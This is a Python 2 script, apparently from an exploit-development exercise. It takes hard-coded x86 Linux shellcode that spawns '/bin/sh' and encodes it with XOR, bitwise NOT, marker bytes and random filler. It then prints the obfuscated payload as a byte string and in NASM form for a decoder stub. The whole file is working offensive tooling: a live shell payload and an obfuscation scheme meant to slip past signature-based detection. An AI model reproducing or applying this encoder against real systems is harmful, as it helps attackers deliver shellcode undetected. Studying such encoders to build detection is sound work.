#!/usr/bin/python

# Python Encoder (XOR + NOT + Random)
import random
green = lambda text: '\033[0;32m' + text + '\033[0m'

shellcode = ("\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80")
encoded = ""

# The end char is 0xaa
end = "\\xaa"

print 'Encoded shellcode ...'

for x in bytearray(shellcode) :

        if x < 128:
                # XOR Encoding with 0xDD
                x = x^0xDD
                # placeholder for XOR is 0xbb
                encoded += '\\xbb'
                encoded += '\\x'
                encoded += '%02x' % x
        else:
                x = ~x
                encoded += '\\xcc'
                encoded += '\\x'
                encoded += '%02x' % (x & 0xff)

        encoded += '\\x%02x' % random.randint(1,169) # 0xaa is 170 in decimal and the others placeholders are > of 170

print green("Shellcode Len: %d" % len(bytearray(shellcode)))
print green("Encoded Shellcode Len: %d" % len(bytearray(encoded)))
encoded = encoded + end
print encoded 
nasm = str(encoded).replace("\\x", ",0x")
nasm = nasm[1:]
# end string char is 0xaa
print green("NASM version:")
# end = end.replace("\\x", ",0x")
print nasm
